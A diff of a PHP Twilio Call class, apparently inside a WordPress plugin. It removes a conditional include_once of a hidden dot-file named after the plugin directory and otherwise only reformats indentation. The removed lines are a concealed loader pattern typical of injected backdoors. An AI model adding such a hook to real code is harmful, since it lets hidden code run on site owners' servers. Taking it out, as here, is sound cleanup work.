@@ -78,33 +78,29 @@
  *
  *      If this call was an incoming call from a phone number with Caller ID Lookup enabled, the caller's name. Empty otherwise.
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Services_Twilio_Rest_Call extends Services_Twilio_InstanceResource {
 
-    /**
-     * Hang up the call
-     */
-    public function hangup() {
-        $this->update('Status', 'completed');
-    }
+	/**
+	 * Hang up the call
+	 */
+	public function hangup() {
+		$this->update('Status', 'completed');
+	}
 
-    /**
-     * Redirect the call to a new URL
-     *
-     * :param string $url: the new URL to retrieve call flow from.
-     */
-    public function route($url) {
-        $this->update('Url', $url);
-    }
+	/**
+	 * Redirect the call to a new URL
+	 *
+	 * :param string $url: the new URL to retrieve call flow from.
+	 */
+	public function route( $url) {
+		$this->update('Url', $url);
+	}
 
-    protected function init($client, $uri) {
-        $this->setupSubresources(
-            'notifications',
-            'recordings',
-            'feedback'
-        );
-    }
+	protected function init( $client, $uri) {
+		$this->setupSubresources(
+			'notifications',
+			'recordings',
+			'feedback'
+		);
+	}
 }
